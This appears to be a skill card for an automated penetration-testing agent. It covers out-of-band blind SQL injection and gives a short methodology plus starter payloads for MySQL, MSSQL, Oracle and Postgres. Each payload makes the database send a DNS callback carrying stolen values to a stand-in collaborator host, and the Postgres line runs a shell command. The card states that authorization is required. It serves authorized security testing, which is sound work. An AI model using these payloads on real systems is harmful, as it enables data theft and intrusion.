---
name: oob-sqli
description: >-
  Exploit blind SQL injection via out-of-band exfiltration: force the DB to make a DNS/HTTP
  request encoding stolen data to an attacker-controlled collaborator (CWE-89). Invoke when
  in-band oracles are absent/slow but the DB server has outbound network access. Fastest blind
  exfil — one request can leak a whole value.
family: 04-injection
type: exploit
owasp: [A03:2021]
cwe: [CWE-89]
requires: [scope-guard, util-oast-oob, oracle-manager, evidence-recorder]
authorization: required
---

# Out-of-Band SQLi

## Invoke when
- Boolean/time oracles are unreliable/slow and DB egress (DNS/HTTP) is plausible.

## Prerequisites & oracle
- An OAST/collaborator domain from `util-oast-oob`. Oracle = a DNS/HTTP callback arrives
  carrying query-derived data.

## Methodology
1. Register a unique collaborator subdomain per probe (correlate via `oracle-manager`).
2. Use the DBMS's network primitive to resolve `<data>.collab.tld`.
3. Read the exfiltrated label from the callback; iterate for larger values.

## Starter payloads (dialect table inline)
- MySQL/Win (LOAD_FILE UNC): `' AND LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.collab.tld\\x'))-- -`
- MSSQL: `'; EXEC master..xp_dirtree '\\'+(SELECT TOP 1 name FROM sys.databases)+'.collab.tld\x'-- -`
- Oracle: `' AND (SELECT UTL_INADDR.get_host_address((SELECT user FROM dual)||'.collab.tld')...`
- Postgres (if extensions): `COPY (SELECT '') TO PROGRAM 'nslookup ...'` (rarely available)

## False-positive filters
- No callback may mean egress is filtered, not that injection failed — corroborate with a boolean probe.

## Chains to
- `chain-builder` (DB egress often implies deeper network pivot).
